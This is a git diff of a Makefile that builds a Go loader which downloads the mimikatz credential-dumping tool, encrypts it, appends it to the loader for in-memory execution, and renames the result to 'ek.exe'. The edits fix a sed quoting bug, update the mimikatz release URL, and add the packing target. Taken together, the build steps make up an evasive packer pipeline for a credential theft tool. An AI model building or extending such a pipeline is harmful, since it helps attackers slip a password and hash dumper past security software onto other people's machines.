@@ -10,7 +10,7 @@ all: pack
 # Build the dependencies first (subdirs), then move onto the meat and potatoes.
 mimikatz.exe: MemoryModule mimikatz.go
 	CC=$(compiler) CGO_ENABLED=1 GOOS=windows GOARCH=$(arch) go build -x mimikatz.go
-	sed -i "s/^\\(const SIZE int = \\).*\$$/\\1`du -bs mimikatz.exe | sed 's/[[:blank:]].*//'`"/g mimikatz.go
+	sed -i "s/^\\(const SIZE int = \\).*\$$/\\1`du -bs mimikatz.exe | sed 's/[[:blank:]].*//'`/g" mimikatz.go
 	CC=$(compiler) CGO_ENABLED=1 GOOS=windows GOARCH=$(arch) go build -x mimikatz.go
 
 
@@ -28,6 +28,7 @@ MemoryModule:
 # Packing it inside of the loader
 pack: encrypt mimikatz.exe
 	cat mimi_encrypted >> mimikatz.exe
+	mv mimikatz.exe ek.exe
 
 # Encrypting the binary
 encrypt: crypt download
@@ -37,7 +38,7 @@ crypt: crypt.go
 	go build crypt.go
 
 download:
-	curl -OL https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.7z
+	curl -OL https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180205/mimikatz_trunk.7z
 
 
 # Clean target. 
@@ -50,4 +51,4 @@ $(CLEANDIRS):
 test:
 	$(MAKE) -C tests test
 
-.PHONY: subdirs $(INSTALLDIRS) $(SUBDIRS) clean test encrypt download
+.PHONY: subdirs $(INSTALLDIRS) $(SUBDIRS) clean test encrypt download pack
